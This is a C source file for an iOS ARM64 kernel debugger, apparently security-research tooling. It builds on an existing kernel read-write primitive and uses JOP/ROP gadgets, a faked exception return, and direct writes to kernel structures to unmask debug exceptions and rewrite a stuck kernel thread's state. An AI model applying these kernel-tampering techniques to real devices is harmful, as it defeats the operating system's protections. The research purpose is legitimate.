#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <pthread.h>

#include "kdbg.h"
#include "kutils.h"
#include "kmem.h"
#include "symbols.h"
#include "kcall.h"
#include "find_port.h"
#include "early_kalloc.h"
#include "arm64_state.h"

extern uint64_t kernel_leak;

/*
 A thread-local iOS kernel debugger for all ARM64 devices

 This code uses a kernel memory read-write primitve to enable a hardware breakpoint in EL1 on a particular thread.

 When that bp triggers it will eventually end up stuck in a loop:
 
 case ESR_EC_BKPT_REG_MATCH_EL1:
   if (FSC_DEBUG_FAULT == ISS_SSDE_FSC(esr)) {
     kprintf("Hardware Breakpoint Debug exception from kernel.  Hanging here (by design).\n");
     for (;;);
 
 That thread will eventually get preempted; when that happens we'll find its state (from userspace) and modify it
 such that it breaks out of that loop and continues with the desired state.
 
 Doing this requires careful attention to how aarch64 exceptions work, how XNU handles nested exceptions
 and how context switching works. A description of this is given below:
 
 AArch64 Exceptions:
 There are four classes of AArch64 exceptions: Synchronous, IRQ, FIQ, SError. These exceptions are the only
 way which the CPU will transition between Exception Levels (EL.) There are four Exception Levels: EL0, EL1,
 EL2, EL3. In iOS userspace runs in EL0 and the kernel runs in EL1. These are similar to the Ring 0 & Ring 3
 in x86. All 64-bit iOS devices below iPhone 7 also contain a secure monitor which runs in EL3.
 
 Exception types:
 
  Synchronous: These are things like SVC instructions (used for syscalls), breakpoints, data aborts etc
  IRQ: These are external interrupts from devices
  FIQ: These are also external interrupts
  SError: These are system errors, things like ECC errors
 
 For our purposes we're interested in Synchronous and FIQ interrupts. Hardware breakpoints are synchronous exceptions.
 The timer which drives the scheduler is attached as an FIQ source.
 
 Aarch64 further subdivides those four exception classes into another four categories depending on where the
 exception came from:
 a) Exception came from the current exception level which was running on SP_EL0
 b) Exception came from the current exception level which was running on SP_EL1
 c) Exception came from a lower exception level which was executing in AArch64 mode
 d) Exception came from a lower exception level which was executing in AArch32 mode
 
 Each of these 16 cases has their own vector (handling routine.)
 
 sp registers:
 sp isn't a general purpose register; it's better to view it as an alias for one of four seperate hardware registers:
 SP_EL0, SP_EL1, SP_EL2, SP_EL3.
 
 When an exception is taken sp will be set to name the SP_ELX register for the exception level which the exception is taken to.
 For example, when userspace (EL0) makes a syscall (Synchronous exception to EL1 from lower exception level) sp will name SP_EL1 in the handler.
 
 To enable nested exceptions code generally switches back to using SP_EL0 regardless of which exception level it's actually
 running at (obviously after first saving the original value of SP_EL0 so it can be restored.)
 
Nested exceptions and masking:

 The four PSTATE.{A,D,F,I} bits control exception masking. Whenever any exception is taken these four bits will be set.
 
 PSTATE.A: SError interrupts will be pended until this bit is cleared
 PSTATE.F: FIQ interrupts will be pended until this bit is cleared
 PSTATE.I: IRQ interrupts will be pended until this bit is cleared
 PSTATE.D: Debug interrupts will be suppressed until this bit is cleared
 
 These bits can be manually set/cleared by writing to the DAIFSet/DAIFClr msrs. The bits will also be restored to their saved value
 during an ERET (return from exception) from the SPSR_ELX register (where X is the EL the exception was taken to.)
 
 Synchronous exceptions which are not Debug exceptions cannot be masked. However Debug exceptions will be suppressed, and XNU doesn't re-enable
 them. This presents the first major hurdle to implementing this debugger as the exceptions generated by hardware breakpoints fall in to
 the Debug category and will therefore never generate exceptions even if we set them and enable them for EL1.
 
 Note that the Debug exceptions will be suppresssed, that is, they will never fire, unlike the other maskable interrupts which will just be pended
 and will fire as soon as they are un-masked.
 
Re-enabling Debug exceptions during syscall execution:
 The trick to clearing PSTATE.D is to fake a return from an exception by calling ERET using a arbitrary-call primitive.
 
 See below in the code for exactly the right gadget which will let us restore a complete register state (including CPSR.)
 
 With PSTATE.D cleared we point pc back to near the start of the syscall handling path so we can fake the execution of an arbitrary
 syscall.
 
There are a couple of other things preventing HW breakpoints firing:
 
 The Kernel Debug Enable bit has to be set in MDSCR_EL1. This can be set with some simple ROP. It's per-core, and it won't be cleared if we get
 scheduled off so it's sufficient to just set it once.

 We can use the thread_set_state API to set a breakpoint on a kernel address, but it sanitizes the BCRX control flags so it's also
 necessary to set ARM_DBG_CR_MODE_CONTROL_ANY using the kernel memory r/w.
 
Finding a modifying the stuck thread state:
 This is explained below. We pin a monitor thread to the same core as the debugee then search the debugee's kernel stack looking for the
 set of stack frames which indicate it's got stuck in the kernel hw bp hit infinite loop.
 
 We then expose the state at the bp to a callback which can modify it before unblocking the stuck kernel thread.
 
Limitations:
 I only wrote code to support one breakpoint at the moment, expect a fuller-featured, interactive version soon!
 
 Don't set breakpoints when things like spinlocks are held, it will go very badly.
 
 Single-step won't work. In the breakpoint handler you have to emulate the instruction and manually move pc on.
 
 It's slow! This is unlikely to change give how it works, but hey, you're modifying kernel thread state from userspace on the same machine!
 
 */

// scheduling mach trap to yield the cpu
extern boolean_t swtch_pri(int pri);

// pin the current thread to a processor, returns a pointer to the processor we're pinned to
uint64_t pin_current_thread() {
  // get the current thread_t:
  uint64_t th = current_thread();

#if 0
  // get the processor_t this thread last ran on
  uint64_t processor = rk64(th + koffset(KSTRUCT_OFFSET_THREAD_LAST_PROCESSOR));
  printf("thread %llx last ran on %llx, pinning it to that core\n", th, processor);
  
  // this is probably fine...
  wk64(th + koffset(KSTRUCT_OFFSET_THREAD_BOUND_PROCESSOR), processor);
#endif
  
  // need the struct cpu_data for that processor which is stored in the CpuDataEntries array, declared in data.s
  // it's 6*4k in to the data segment
  uint64_t cpu_data_entries = ksym(KSYMBOL_CPU_DATA_ENTRIES);
  
  int cpu_id = 0;
  
  // it's an array of cpu_data_entry_t which contains just the 64-bit physical and virtual addresses of struct cpu_data
  uint64_t cpu_data = rk64(cpu_data_entries + ((cpu_id * 0x10) + 8));
  
  uint64_t processor = rk64(cpu_data + koffset(KSTRUCT_OFFSET_CPU_DATA_CPU_PROCESSOR));
  printf("trying to pin to cpu0: %llx\n", processor);
  // pin to that cpu
  // this is probably fine...
  wk64(th + koffset(KSTRUCT_OFFSET_THREAD_BOUND_PROCESSOR), processor);
  
  // that binding will only take account once we get scheduled off and back on again so yield the cpu:
  printf("pin_current_thread yielding cpu\n");
  swtch_pri(0);
  printf("pin_current_thread back on cpu\n");
  uint64_t chosen = rk64(th + koffset(KSTRUCT_OFFSET_THREAD_CHOSEN_PROCESSOR));
  printf("running on %llx\n", chosen);

#if 0
  // should now be running on the chosen processor, and should only get scheduled on there:
  printf("we're running again!\n");

  
  int got_switched = 0;
  for (int i = 0; i < 1000; i++) {
    swtch_pri(0);
    uint64_t p = rk64(th + koffset(KSTRUCT_OFFSET_THREAD_CHOSEN_PROCESSOR));
    if (p != processor) {
      printf("got moved off target processor\n");
      got_switched = 1;
      break;
    }
    usleep(15000);
    p = rk64(th + koffset(KSTRUCT_OFFSET_THREAD_CHOSEN_PROCESSOR));
    if (p != processor) {
      printf("got moved off target processor\n");
      got_switched = 1;
      break;
    }
  }
  if (!got_switched) {
    printf("looks like pinning works!\n");
  }
#endif
  return processor;
}

#if 0

use the two argument arbitrary call to call this:
__TEXT_EXEC:__text:FFFFFFF0070CC1AC                 MOV             X21, X0
__TEXT_EXEC:__text:FFFFFFF0070CC1B0                 MOV             X22, X1
__TEXT_EXEC:__text:FFFFFFF0070CC1B4                 BR              X22

that gives control of x21 and pc

point pc to this:

exception_return:
msr    DAIFSet, #(DAIFSC_IRQF | DAIFSC_FIQF)  // Disable interrupts
mrs    x3, TPIDR_EL1            // Load thread pointer
mov    sp, x21                // Reload the pcb pointer

/* ARM64_TODO Reserve x18 until we decide what to do with it */
ldr    x0, [x3, TH_CTH_DATA]        // Load cthread data pointer
str    x0, [sp, SS64_X18]          // and use it to trash x18

Lexception_return_restore_registers:
/* Restore special register state */
ldr    x0, [sp, SS64_PC]          // Get the return address
ldr    w1, [sp, SS64_CPSR]          // Get the return CPSR
ldr    w2, [sp, NS64_FPSR]
ldr    w3, [sp, NS64_FPCR]

msr    ELR_EL1, x0              // Load the return address into ELR
msr    SPSR_EL1, x1            // Load the return CPSR into SPSR
msr    FPSR, x2
msr    FPCR, x3              // Synchronized by ERET

mov   x0, sp                // x0 = &pcb

/* Restore arm_neon_saved_state64 */
ldp    q0, q1, [x0, NS64_Q0]
ldp    q2, q3, [x0, NS64_Q2]
ldp    q4, q5, [x0, NS64_Q4]
ldp    q6, q7, [x0, NS64_Q6]
ldp    q8, q9, [x0, NS64_Q8]
ldp    q10, q11, [x0, NS64_Q10]
ldp    q12, q13, [x0, NS64_Q12]
ldp    q14, q15, [x0, NS64_Q14]
ldp    q16, q17, [x0, NS64_Q16]
ldp    q18, q19, [x0, NS64_Q18]
ldp    q20, q21, [x0, NS64_Q20]
ldp    q22, q23, [x0, NS64_Q22]
ldp    q24, q25, [x0, NS64_Q24]
ldp    q26, q27, [x0, NS64_Q26]
ldp    q28, q29, [x0, NS64_Q28]
ldp    q30, q31, [x0, NS64_Q30]

/* Restore arm_saved_state64 */

// Skip x0, x1 - we're using them
ldp    x2, x3, [x0, SS64_X2]
ldp    x4, x5, [x0, SS64_X4]
ldp    x6, x7, [x0, SS64_X6]
ldp    x8, x9, [x0, SS64_X8]
ldp    x10, x11, [x0, SS64_X10]
ldp    x12, x13, [x0, SS64_X12]
ldp    x14, x15, [x0, SS64_X14]
ldp    x16, x17, [x0, SS64_X16]
ldp    x18, x19, [x0, SS64_X18]
ldp    x20, x21, [x0, SS64_X20]
ldp    x22, x23, [x0, SS64_X22]
ldp    x24, x25, [x0, SS64_X24]
ldp    x26, x27, [x0, SS64_X26]
ldr    x28, [x0, SS64_X28]
ldp    fp, lr, [x0, SS64_FP]

// Restore stack pointer and our last two GPRs
ldr    x1, [x0, SS64_SP]
mov    sp, x1
ldp    x0, x1, [x0, SS64_X0]        // Restore the GPRs

eret

this lets us eret with a completely controlled state :)

use that to clear PSTATE.D, and return to EL1+SP0

return to:

.text
.align 2
fleh_synchronous:
mrs    x1, ESR_EL1              // Load exception syndrome
mrs    x2, FAR_EL1              // Load fault address
and    w3, w1, #(ESR_EC_MASK)
lsr    w3, w3, #(ESR_EC_SHIFT)
mov    w4, #(ESR_EC_IABORT_EL1)
cmp    w3, w4
b.eq  Lfleh_sync_load_lr
Lvalid_link_register:                    <-- ***there***

PUSH_FRAME
bl    EXT(sleh_synchronous)
POP_FRAME

b    exception_return_dispatch

in ip7 11.1.2 that's:
__TEXT_EXEC:__text:FFFFFFF0070CC1D4                 STP             X29, X30, [SP,#var_10]!
__TEXT_EXEC:__text:FFFFFFF0070CC1D8                 MOV             X29, SP
__TEXT_EXEC:__text:FFFFFFF0070CC1DC                 BL              loc_FFFFFFF0071DDED4
__TEXT_EXEC:__text:FFFFFFF0070CC1E0                 MOV             SP, X29
__TEXT_EXEC:__text:FFFFFFF0070CC1E4                 LDP             X29, X30, [SP+0x10+var_10],#0x10
__TEXT_EXEC:__text:FFFFFFF0070CC1E8                 B               sub_FFFFFFF0070CC3CC

in the state which we get loaded:
x21 should point to the actual saved ACT_CONTEXT since x21 will be used in the return path if no ASTs are taken
x0 should point to the saved state which we want the debugged syscall to see (not ACT_CONTEXT!)
x1 should be the svn syndrome number (ESR_EC(esr) == ESR_EC_SVC_64)
x2 should be the pc of the svc instruction
sp should be the right place on the thread's kernel stack

#endif


struct syscall_args {
  uint32_t number;
  uint64_t arg[8];
};

void do_syscall_with_pstate_d_unmasked(struct syscall_args* args) {
  // get the target thread_t
  //uint64_t thread_port_addr = find_port_address(target_thread_port, MACH_MSG_TYPE_COPY_SEND);
  //uint64_t thread_t_addr = rk64(thread_port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));

  uint64_t thread_t_addr = current_thread();
  
  /* this state should set up as if it were calling the target syscall */
  arm_context_t fake_syscall_args = {0};
  
  /* this state will be restored by an eret */
  arm_context_t eret_return_state = {0};

  // there's no need to initialize too much of this since it won't actually be the state which is restored
  // it just needs to be enough to get the target syscall called
  fake_syscall_args.ss.ss_64.x[16] = args->number;
  fake_syscall_args.ss.ss_64.x[0] = args->arg[0];
  fake_syscall_args.ss.ss_64.x[1] = args->arg[1];
  fake_syscall_args.ss.ss_64.x[2] = args->arg[2];
  fake_syscall_args.ss.ss_64.x[3] = args->arg[3];
  fake_syscall_args.ss.ss_64.x[4] = args->arg[4];
  fake_syscall_args.ss.ss_64.x[5] = args->arg[5];
  fake_syscall_args.ss.ss_64.x[6] = args->arg[6];
  fake_syscall_args.ss.ss_64.x[7] = args->arg[7];
  
  fake_syscall_args.ss.ash.flavor = ARM_SAVED_STATE64;
  
  fake_syscall_args.ss.ss_64.cpsr = 0;
  
  // allocate a copy of that in wired kernel memory:
  //uint64_t fake_syscall_args_kern = kmem_alloc_wired(sizeof(arm_context_t));
  uint64_t fake_syscall_args_kern = early_kalloc(sizeof(arm_context_t));
  kmemcpy(fake_syscall_args_kern, (uint64_t)&fake_syscall_args, sizeof(arm_context_t));
  
  // this state needs to be a bit more complete...
  // x0 of the eret restored state will be the arm_context_t which the syscall dispatch code sees
  eret_return_state.ss.ss_64.x[0] = fake_syscall_args_kern;
  
  // x1 will be the exception syndrome
  #define ESR_EC_SVC_64 0x15
  #define ESR_EC_SHIFT 26
  eret_return_state.ss.ss_64.x[1] = ESR_EC_SVC_64 << ESR_EC_SHIFT;
  
  // x2 will be the address of the exception, not relevant for a syscall
  eret_return_state.ss.ss_64.x[2] = 0x454545454540;
  
  // x21 will be the real saved state to be used to return back to EL0
  // this is the state which was spilled during the actual EL0 -> EL1 transition.
  // if a continuation is run x21 won't be used, instead the return will go via the thread's ACT_CONTEXT
  // so this makes both paths safe
  uint64_t act_context = rk64(thread_t_addr + koffset(KSTRUCT_OFFSET_THREAD_CONTEXT_DATA));
  eret_return_state.ss.ss_64.x[21] = act_context;
  
  // let's stay on the thread's actual kernel stack
  uint64_t thread_kernel_stack_top = rk64(thread_t_addr + koffset(KSTRUCT_OFFSET_THREAD_KSTACKPTR));
  eret_return_state.ss.ss_64.sp = thread_kernel_stack_top;
  
  // the target place to eret to (see code snippet above)
  eret_return_state.ss.ss_64.pc = ksym(KSYMBOL_VALID_LINK_REGISTER);
  
  // the whole point of this, cpsr! this will be restored to SPSR_EL1 before the eret
  // see D1.6.4 of the armv8 manual
  // we want to return on to SP0 and to EL1
  // A,I,F should still be masked, D unmasked
#define SPSR_A   (1<<8)
#define SPSR_I   (1<<7)
#define SPSR_F   (1<<6)
#define SPSR_EL1_SP0 (0x4)
  eret_return_state.ss.ss_64.cpsr = SPSR_A | SPSR_I | SPSR_F | SPSR_EL1_SP0;
  
  //uint64_t eret_return_state_kern = kmem_alloc_wired(sizeof(arm_context_t));
  uint64_t eret_return_state_kern = early_kalloc(sizeof(arm_context_t));
  kmemcpy(eret_return_state_kern, (uint64_t)&eret_return_state, sizeof(arm_context_t));
  
  // make the arbitrary call
  kcall(ksym(KSYMBOL_X21_JOP_GADGET), 2, eret_return_state_kern, ksym(KSYMBOL_EXCEPTION_RETURN));
}


/*
 we want to call this gadget:
 FFFFFFF0071E1998 MSR #0, c0, c2, #2, X8 ; [>] MDSCR_EL1 (Monitor Debug System Control Register)
 FFFFFFF0071E199C ISB // this a workaround for some errata...
 FFFFFFF0071E19A0 B    loc_FFFFFFF0071E19F8
 ...
 FFFFFFF0071E19F8 BL   _ml_set_interrupts_enabled
 FFFFFFF0071E19FC ADD  SP, SP, #0x220
 FFFFFFF0071E1A00 LDP  X29, X30, [SP,#0x20+var_s0]
 FFFFFFF0071E1A04 LDP  X20, X19, [SP,#0x20+var_10]
 FFFFFFF0071E1A08 LDP  X28, X27, [SP+0x20+var_20],#0x30
 FFFFFFF0071E1A0C RET

 lets just use the ERET case to get full register control an run that on a little ROP stack which then
 returns to thread_exception_return
 
 */
void set_MDSCR_EL1_KDE(mach_port_t target_thread_port) {
  /* this state will be restored by an eret */
  arm_context_t eret_return_state = {0};
  
  // allocate a stack for the rop:
  //uint64_t rop_stack_kern_base = kmem_alloc_wired(0x4000);
  uint64_t rop_stack_kern_base = early_kalloc(0x1000);
  
  uint64_t rop_stack_kern_middle = rop_stack_kern_base + 0xc00;
  
  eret_return_state.ss.ss_64.sp = rop_stack_kern_middle;
  uint64_t rop_stack_kern_popped_base = rop_stack_kern_middle + 0x220;
  // x28, x27, x20, x19, fp, lr
  uint64_t popped_regs[] = {0, 0, 0, 0, 0x414243444546, ksym(KSYMBOL_THREAD_EXCEPTION_RETURN)}; // directly return back to userspace after this
  kmemcpy(rop_stack_kern_popped_base, (uint64_t)popped_regs, sizeof(popped_regs));

#define MDSCR_EL1_KDE (1<<13)
  eret_return_state.ss.ss_64.x[8] = MDSCR_EL1_KDE;
  
  // the target place to eret to
  eret_return_state.ss.ss_64.pc = ksym(KSYMBOL_SET_MDSCR_EL1_GADGET);
  
  // we want to return on to SP0 and to EL1
  // A,I,F should still be masked, D unmasked (here we could actually mask D?)
#define SPSR_A   (1<<8)
#define SPSR_I   (1<<7)
#define SPSR_F   (1<<6)
#define SPSR_EL1_SP0 (0x4)
  eret_return_state.ss.ss_64.cpsr = SPSR_A | SPSR_I | SPSR_F | SPSR_EL1_SP0;
  
  //uint64_t eret_return_state_kern = kmem_alloc_wired(sizeof(arm_context_t));
  uint64_t eret_return_state_kern = early_kalloc(sizeof(arm_context_t));
  kmemcpy(eret_return_state_kern, (uint64_t)&eret_return_state, sizeof(arm_context_t));
  
  // make the arbitrary call
  kcall(ksym(KSYMBOL_X21_JOP_GADGET), 2, eret_return_state_kern, ksym(KSYMBOL_EXCEPTION_RETURN));
  
  printf("returned from trying to set the KDE bit\n");
  
  // free the stack we used:
  //kmem_free(rop_stack_kern_base, 0x4000);
}



/*
 target_thread_port is the thread port for a thread which may or already has hit a kernel hw breakpoint.
 detect whether that is the case, and if so find the register state when the BP was hit.
 
 where to find stuff:
 
 userspace svc: EL0+SP0 -> EL1+SP1 (sync exception from lower exception level running aarch64)
 userspace state gets saved in thread->ACT_CONTEXT
 stack switched to thread's kernel stack pointer and SP0 selected
 does stuff which then hits kernel hw bp
 
 kernel hw bp: EL1+SP0 -> EL1+SP1 (sync exception from same exception level running on SP0)
 switch back to SP0 and push new arm_context_t on the there. point x21 to this saved state area.
 control flow reaches infinite loop
 
 fiq timer: EL1+SP0 -> EL1+SP1 (fiq interrupt from same exception level running on SP0)
 switch back to SP0 and push new arm_context_t on there. point x21 to there.
 then set sp to the interrupt stack.
 
 schedule off:
 this will happen just before the fiq timer interrupt returns in return_to_kernel
 it will set sp back to x21 (as if to eret back to the previous exception level) then call ast_taken_kernel
 
 if the thread will be scheduled off just a small amount of state will be saved to the reserved area
 above the top of the thread's kernel stack, sufficient to get the thread back on the core and
 resume execution.
 
 
   +-----------------------------+
   |                             |
   | struct thread_kernel_state  | <-- *above* the top of thread kernel stack
   |                             |
+> +=============================+ <-- top of thread kernel stack
|  |                             |
|  | syscall stack frames of     |
|  | varying depth               |
|  | (not user state)            |
|  |                             |
|  +-----------------------------+ <-- kernel hw bp: EL1+SP0 -> EL1+SP1 (sync exception from same exception level running on SP0)
|  |                             | <-- saved state from when the bp was hit
|  | struct arm_context_t        |
|  | .pc = address of hit bp     |
|  +~~~~~~~~~~~~~~~~~~~~~~~~~~~~~+
|  |                             |
|  |                             |
|  | stack frames from sync excp |
|  | to the infinite loop...     |
|  |                             |
|  +-----------------------------+ <-- fiq timer: EL1+SP0 -> EL1+SP1 (fiq interrupt from same exception level running on SP0)
|  | struct arm_context_t        | <-- saved state from the infinite loop before it was scheduled off
|  | .pc = addr of the infinite  |
|  |       loop instr            |
|  |~~~~~~~~~~~~~~~~~~~~~~~~~~~~~+
|  |                             |
|  |                             |
|  |                             |
|  |                             |
+- +-----------------------------+
 */

typedef void (*breakpoint_callback)(arm_context_t* context);

volatile int syscall_complete = 0;

void handle_kernel_bp_hits(mach_port_t target_thread_port, uint64_t looper_pc, uint64_t breakpoint, breakpoint_callback callback) {
  // get the target thread's thread_t
  uint64_t thread_port_addr = find_port_address(target_thread_port, MACH_MSG_TYPE_COPY_SEND);
  uint64_t thread_t_addr = rk64(thread_port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
  
  while (1) {
    uint64_t looper_saved_state = 0;
    int found_it = 0;
    while (!found_it) {
      if (syscall_complete) {
        return;
      }
      // we've pinned ourself to the same core, so if we're running, it isn't...
      // in some ways this code is very racy, but when we actually have detected that the target
      // thread has hit the breakpoint it should be safe until we restart it
      // and up until then we don't do anything too dangerous...
      
      
      // get the kstack pointer
      uint64_t kstackptr = rk64(thread_t_addr + koffset(KSTRUCT_OFFSET_THREAD_KSTACKPTR));
      
      printf("kstackptr: %llx\n", kstackptr);
      
      // get the thread_kernel_state
      // the stack lives below kstackptr, and kstackptr itself points to a struct thread_kernel_state:
      // the first bit of that is just an arm_context_t:
      // this is the scheduled-off state
      arm_context_t saved_ksched_state = {0};
      kmemcpy((uint64_t)&saved_ksched_state, kstackptr, sizeof(arm_context_t));
      
      // get the saved stack pointer
      uint64_t sp = saved_ksched_state.ss.ss_64.sp;
      printf("sp: %llx\n", sp);

      if (sp == 0) {
        continue;
      }
      
      uint64_t stack[128] = {0};
      
      // walk up from there and look for the saved state dumped by the fiq:
      // note that it won't be right at the bottom of the stack
      // instead there are the frames for:
      //   ast_taken_kernel       <-- above this is the saved state which will get restored when the hw bp spinner gets rescheduled
      //     thread_block_reason
      //       thread_invoke
      //         machine_switch_context
      //           Switch_context <-- the frame actually at the bottom of the stack
      
      // should probably walk those stack frame properly, but this will do...
      
      // grab the stack
      kmemcpy((uint64_t)&stack[0], sp, sizeof(stack));
      //for (int i = 0; i < 128; i++) {
      //  printf("%016llx\n", stack[i]);
      //}
      
      for (int i = 0; i < 128; i++) {
        uint64_t flavor_and_count = stack[i];
        if (flavor_and_count != (ARM_SAVED_STATE64 | (((uint64_t)ARM_SAVED_STATE64_COUNT) << 32))) {
          continue;
        }
        
        arm_context_t* saved_state = (arm_context_t*)&stack[i];
        
        if (saved_state->ss.ss_64.pc != looper_pc) {
          continue;
        }
        
        found_it = 1;
        looper_saved_state = sp + (i*sizeof(uint64_t));
        printf("found the saved state probably at %llx\n", looper_saved_state); // should walk the stack properly..
        break;
      }
      
      if (!found_it) {
        printf("unable to find the saved scheduler tick state on the stack, waiting a bit then trying again...\n");
        sleep(1);
        return;
      }
      
    }
    
    
    
    // now keep walking up and find the saved state for the code which hit the BP:
    uint64_t bp_hitting_state = looper_saved_state + sizeof(arm_context_t);
    found_it = 0;
    for (int i = 0; i < 1000; i++) {
      uint64_t flavor_and_count = rk64(bp_hitting_state);
      if (flavor_and_count != (ARM_SAVED_STATE64 | (((uint64_t)ARM_SAVED_STATE64_COUNT) << 32))) {
        bp_hitting_state += 8;
        continue;
      }
      
      arm_context_t bp_context;
      kmemcpy((uint64_t)&bp_context, bp_hitting_state, sizeof(arm_context_t));
      
      for (int i = 0; i < 40; i++) {
        uint64_t* buf = (uint64_t*)&bp_context;
        printf("%016llx\n", buf[i]);
      }
        
      
      if (bp_context.ss.ss_64.pc != breakpoint) {
        printf("hummm, found an unexpected breakpoint: %llx\n", bp_context.ss.ss_64.pc);
      }
      
      found_it = 1;
      break;
    }
    
    if (!found_it) {
      printf("unable to find bp hitting state\n");
    }
    
    // fix up the bp hitting state so it will continue (with whatever modifications we want:)
    // get a copy of the state:
    arm_context_t bp_context;
    kmemcpy((uint64_t)&bp_context, bp_hitting_state, sizeof(arm_context_t));
      
      printf("ALRIGHTY, HERE'S PC: 0x%llx\n", bp_context.ss.ss_64.pc);
      kernel_leak = bp_context.ss.ss_64.pc;
    
    callback(&bp_context);
    
    // write that new state back:
    kmemcpy(bp_hitting_state, (uint64_t)&bp_context, sizeof(arm_context_t));
    
    // unblock the looper:
    wk64(looper_saved_state + offsetof(arm_context_t, ss.ss_64.pc), ksym(KSYMBOL_SLEH_SYNC_EPILOG));
    
    // when it runs again it should break out of the loop and continue the syscall
    // forces us off the core and hopefully it on:
    thread_switch(target_thread_port, 0, 0);
    swtch_pri(0);
    
  }
}

struct monitor_args {
  mach_port_t target_thread_port;
  uint64_t breakpoint;
  breakpoint_callback callback;
};


void* monitor_thread(void* arg) {
  struct monitor_args* args = (struct monitor_args*)arg;
  
  printf("monitor thread running, pinning to core\n");
  pin_current_thread();
  printf("monitor thread pinned\n");
  handle_kernel_bp_hits(args->target_thread_port, ksym(KSYMBOL_EL1_HW_BP_INFINITE_LOOP), args->breakpoint, args->callback);
  return NULL;
}

// this runs on the thread which will execute the target syscall to debug
void run_syscall_with_breakpoint(uint64_t bp_address, breakpoint_callback callback, uint32_t syscall_number, uint32_t n_args, ...) {
  // pin this thread to the target cpu:
  pin_current_thread();
  
  // set the Kernel Debug Enable bit of MDSCR_EL1:
  set_MDSCR_EL1_KDE(mach_thread_self());
  
  // MDE will be set by the regular API for us
  
  // enable a hw debug breakpoint at bp_address
  // it won't fire because PSTATE.D will be set, but we'll deal with that in a bit!
  
  // set a hardware bp on the thread using the proper API so that all the structures are already set up:
  struct arm64_debug_state state = {0};
  state.bvr[0] = bp_address;
#define BCR_BAS_ALL (0xf << 5)
#define BCR_E (1 << 0)
  state.bcr[0] = BCR_BAS_ALL | BCR_E; // enabled
  kern_return_t err = thread_set_state(mach_thread_self(),
                                       ARM_DEBUG_STATE64,
                                       (thread_state_t)&state,
                                       sizeof(state)/4);
  
  if (err == 0)//get rid of a compiler warning
    err = err;
  // verify that it got set:
  memset(&state, 0, sizeof(state));
  mach_msg_type_number_t count = sizeof(state)/4;
  err = thread_get_state(mach_thread_self(),
                         ARM_DEBUG_STATE64,
                         (thread_state_t)&state,
                         &count);
  if (err == 0)//get rid of a compiler warning
      err = err;
  if (state.bvr[0] != bp_address) {
    printf("setting the bp address failed\n");
  }
  
  
  // now go and find that thread's DebugData where those values are stored.
  
  uint64_t thread_port_addr = find_port_address(mach_thread_self(), MACH_MSG_TYPE_COPY_SEND);
  uint64_t thread_t_addr = rk64(thread_port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
  
  printf("thread_t_addr: %llx\n", thread_t_addr);
  
  // read bvr[0] in that thread_t's DebugData:
  uint64_t DebugData = rk64(thread_t_addr + ACT_DEBUGDATA_OFFSET);
  //printf("DebugData: %llx\n", DebugData);
  
  uint64_t bvr0 = rk64(DebugData + offsetof(struct arm_debug_aggregate_state, ds64.bvr[0]));
  printf("bvr0 read from the DebugData: 0x%llx\n", bvr0);
  
  uint32_t bcr0 = rk32(DebugData + offsetof(struct arm_debug_aggregate_state, ds64.bcr[0]));
  printf("bcr0 read from the DebugData: 0x%08x\n", bcr0);
  
  // need to manually set this too in the bcr:
#define ARM_DBG_CR_MODE_CONTROL_ANY (3 << 1)
  bcr0 |= ARM_DBG_CR_MODE_CONTROL_ANY;

  wk32(DebugData + offsetof(struct arm_debug_aggregate_state, ds64.bcr[0]), bcr0);
  
  printf("set ARM_DBG_CR_MODE_CONTROL_ANY\n");
  // returning from the syscall should be enough to set it.
  
  struct monitor_args* margs = malloc(sizeof(struct monitor_args));
  margs->target_thread_port = mach_thread_self();
  margs->breakpoint = bp_address;
  margs->callback = callback;
 
  // spin up a thread to monitor when the bp is hit:
  pthread_t th;
  pthread_create(&th, NULL, monitor_thread, (void*)margs);
  printf("started monitor thread\n");
  
  struct syscall_args sargs = {0};
  sargs.number = syscall_number;
  va_list ap;
  va_start(ap, n_args);
  
  for (int i = 0; i < n_args; i++){
    sargs.arg[i] = va_arg(ap, uint64_t);
  }
  
  va_end(ap);
  
  // now execute a syscall with PSTATE.D disabled:
  syscall_complete = 0;
  do_syscall_with_pstate_d_unmasked(&sargs);
  syscall_complete = 1;
  printf("syscall returned\n");
  
  pthread_join(th, NULL);
  printf("monitor exited\n");

}

void sys_write_breakpoint_handler(arm_context_t* state) {
  // we will have to skip it one instruction ahead because single step won't work...
  state->ss.ss_64.pc += 4;
  
  // this means emulating what that instruction did:
  // LDR             X8, [X8,#0x388]
  uint64_t val = rk64(state->ss.ss_64.x[8] + 0x388);
  state->ss.ss_64.x[8] = val;
  
  uint64_t uap = state->ss.ss_64.x[1];
  char* replacer_string = strdup("a different string!\n");
  wk64(uap+8, (uint64_t)replacer_string);
  wk64(uap+0x10, strlen(replacer_string));
}

void raw_syscall(uint32_t syscall_number, uint32_t n_args, ...) {
    // pin this thread to the target cpu:
    pin_current_thread();
    
    struct syscall_args sargs = {0};
    sargs.number = syscall_number;
    va_list ap;
    va_start(ap, n_args);
    
    for (int i = 0; i < n_args; i++){
        sargs.arg[i] = va_arg(ap, uint64_t);
    }
    
    va_end(ap);
    
    // now execute a syscall with PSTATE.D disabled:
    syscall_complete = 0;
    do_syscall_with_pstate_d_unmasked(&sargs);
    syscall_complete = 1;
    printf("syscall returned\n");
    
}

char* hello_wrld_str = "hellowrld!\n";
void test_kdbg() {
  run_syscall_with_breakpoint(ksym(KSYMBOL_WRITE_SYSCALL_ENTRYPOINT),  // breakpoint address
                              sys_write_breakpoint_handler,            // breakpoint hit handler
                              4,                                       // SYS_write
                              3,                                       // 3 arguments
                              1,                                       // stdout
                              (uint64_t)hello_wrld_str,                // "hellowrld!\n"
                              strlen(hello_wrld_str));                 // 11
}
